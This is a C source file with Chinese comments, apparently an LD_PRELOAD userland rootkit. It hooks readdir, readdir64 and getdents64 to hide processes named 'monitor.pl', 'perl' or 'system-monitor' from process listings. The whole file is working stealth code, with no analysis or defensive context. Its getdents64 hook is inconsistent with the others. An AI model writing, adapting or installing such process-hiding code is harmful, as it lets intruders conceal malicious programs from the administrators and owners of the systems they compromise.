#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <limits.h>

#define PATH_MAX 4096
#define CMDLINE_MAX 4096

// 要隐藏的进程名列表
static const char* process_to_filter[] = {
    "monitor.pl",
    "perl",
    "system-monitor",
    NULL
};

// 钩子readdir函数
typedef struct dirent* (*orig_readdir_t)(DIR *dirp);
struct dirent *readdir(DIR *dirp) {
    orig_readdir_t orig_readdir;
    struct dirent *dir;

    orig_readdir = dlsym(RTLD_NEXT, "readdir");
    while(1) {
        dir = orig_readdir(dirp);
        if(dir == NULL) 
            return NULL;

        if(strspn(dir->d_name, "0123456789") == strlen(dir->d_name)) {
            char path[PATH_MAX] = {0};
            if(snprintf(path, PATH_MAX, "/proc/%s/cmdline", dir->d_name) >= PATH_MAX)
                continue;

            FILE *fp = fopen(path, "r");
            if(fp) {
                char cmdline[CMDLINE_MAX] = {0};
                if(fgets(cmdline, sizeof(cmdline), fp)) {
                    int hide = 0;
                    for(int i = 0; process_to_filter[i] != NULL; i++) {
                        if(strstr(cmdline, process_to_filter[i])) {
                            hide = 1;
                            break;
                        }
                    }
                    fclose(fp);
                    if(hide)
                        continue;
                } else {
                    fclose(fp);
                }
            }
        }
        return dir;
    }
}

// 钩子readdir64函数
typedef struct dirent64* (*orig_readdir64_t)(DIR *dirp);
struct dirent64 *readdir64(DIR *dirp) {
    orig_readdir64_t orig_readdir64;
    struct dirent64 *dir;

    orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    while(1) {
        dir = orig_readdir64(dirp);
        if(dir == NULL)
            return NULL;

        if(strspn(dir->d_name, "0123456789") == strlen(dir->d_name)) {
            char path[PATH_MAX] = {0};
            if(snprintf(path, PATH_MAX, "/proc/%s/cmdline", dir->d_name) >= PATH_MAX)
                continue;

            FILE *fp = fopen(path, "r");
            if(fp) {
                char cmdline[CMDLINE_MAX] = {0};
                if(fgets(cmdline, sizeof(cmdline), fp)) {
                    int hide = 0;
                    for(int i = 0; process_to_filter[i] != NULL; i++) {
                        if(strstr(cmdline, process_to_filter[i])) {
                            hide = 1;
                            break;
                        }
                    }
                    fclose(fp);
                    if(hide)
                        continue;
                } else {
                    fclose(fp);
                }
            }
        }
        return dir;
    }
}

// 添加getdents64的hook
typedef __ssize_t (*orig_getdents64_t)(int fd, void *dirp, size_t count);
__ssize_t getdents64(int fd, void *dirp, size_t count) {
    orig_getdents64_t orig_getdents64;
    orig_getdents64 = dlsym(RTLD_NEXT, "getdents64");
    
    __ssize_t nread = orig_getdents64(fd, dirp, count);
    if (nread == -1) return nread;
    
    int pos = 0;
    while (pos < nread) {
        struct linux_dirent64 {
            unsigned long long d_ino;
            long long d_off;
            unsigned short d_reclen;
            unsigned char d_type;
            char d_name[];
        };
        struct linux_dirent64 *d = (struct linux_dirent64 *)(dirp + pos);
        
        int hide = 0;
        for(int i = 0; process_to_filter[i] != NULL; i++) {
            if(strncmp(d->d_name, process_to_filter[i], strlen(process_to_filter[i])) == 0) {
                hide = 1;
                break;
            }
        }
        
        if (hide) {
            int reclen = d->d_reclen;
            memmove(dirp + pos, dirp + pos + reclen, nread - (pos + reclen));
            nread -= reclen;
            continue;
        }
        pos += d->d_reclen;
    }
    return nread;
} 